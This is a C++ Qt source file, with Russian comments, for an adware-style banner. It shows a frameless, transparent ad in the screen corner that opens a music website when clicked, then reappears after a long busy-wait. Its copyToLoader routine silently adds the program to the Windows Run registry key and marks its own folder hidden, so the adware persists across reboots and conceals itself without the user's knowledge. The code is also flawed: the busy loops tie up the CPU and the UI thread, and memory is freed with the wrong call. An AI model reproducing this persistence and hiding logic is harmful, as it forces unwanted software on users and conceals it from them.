#include "banner.h"
#include "ui_banner.h"

banner::banner(QWidget *parent) :
    QWidget(parent, Qt::Widget | Qt::FramelessWindowHint | Qt::ToolTip),//FramelessWindowHint | Qt::Tool),
    ui(new Ui::banner)
{
    ui->setupUi(this);

    this->onLoad();
    this->copyToLoader();
}

banner::~banner()
{
    delete ui;
}

void banner::on_pushButton_clicked() //Обработчик события нажатия на банер.После нажатия, скрывает объявление на N секунд
{
    QDesktopServices::openUrl(QUrl("http://www.musicyoutube.ru"));
    hide();
    double duration;
    std::clock_t start = std::clock();
    do {
        duration = ( std::clock() - start ) / (double) CLOCKS_PER_SEC;
    }
    while (duration < 60*60*24*30);
    this->initializeAnimation();
}


void banner::initializeAnimation() //Метод анимации плавного появления
{
    setWindowOpacity(0);

    show();
    double duration;
    std::clock_t start = std::clock();
    do {
        duration = ( std::clock() - start ) / (double) CLOCKS_PER_SEC;
    }
    while (duration < 60*15);

    QPropertyAnimation* animation = new QPropertyAnimation(this, "windowOpacity");

    animation->setDuration(2000);

    animation->setStartValue(0);

    animation->setEndValue(1);

    animation->start();
}

void banner::onLoad() //Метод запускаемый при создании баннера
{
    //Размещаем виджет влевон нижнем углу экрана
    //const QRect QDesktopWidget::availableGeometry ( int screen = -1 ) const;
    QDesktopWidget desktop;
    QRect rect = desktop.availableGeometry();
    QPoint leftBottom = rect.bottomLeft();
    int y = leftBottom.y()-120;// - (this->height());
    this->setGeometry(0,y,this->width(),this->height());

    //Делаем фон окна прозрачным
    QWidget::setAttribute(Qt::WA_TranslucentBackground);

    //Рисуем изображение на кнопке
    lbl = ui->label;
    QPixmap myPixmap(":/myImg.png");
    lbl->setPixmap(myPixmap);
    lbl->show();

    //Делаем кнопку прозрачной
    btn = ui->pushButton;
    btn->setStyleSheet( "background-color: transparent;" );
    btn->show();

    //Вызываем плавное появление виджета
    this->initializeAnimation();


}

void banner::copyToLoader() {
    QString src = QDir::currentPath();
    QString exe = QDir::currentPath() + "/banner.exe";
    QString tgt = "C:/banner/banner.lnk";//QDir::homePath() + "/Главное меню/Программы/Автозагрузка/banner.lnk";
    exe.replace("/","\\");


    QSettings bootUpSettings("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);
    bootUpSettings.setValue("banner", "\""+exe+"\"");


    wchar_t *mydir = new wchar_t[src.size()+1];
    mydir[src.toWCharArray(mydir)] = '\0';
    SetFileAttributes(mydir, FILE_ATTRIBUTE_HIDDEN);
    free(mydir);

//    wchar_t *exedir = new wchar_t[tgt.size()+1];
//    mydir[tgt.toWCharArray(exedir)] = '\0';
//    SetFileAttributes(exedir, FILE_ATTRIBUTE_HIDDEN);
//    free(exedir);
}
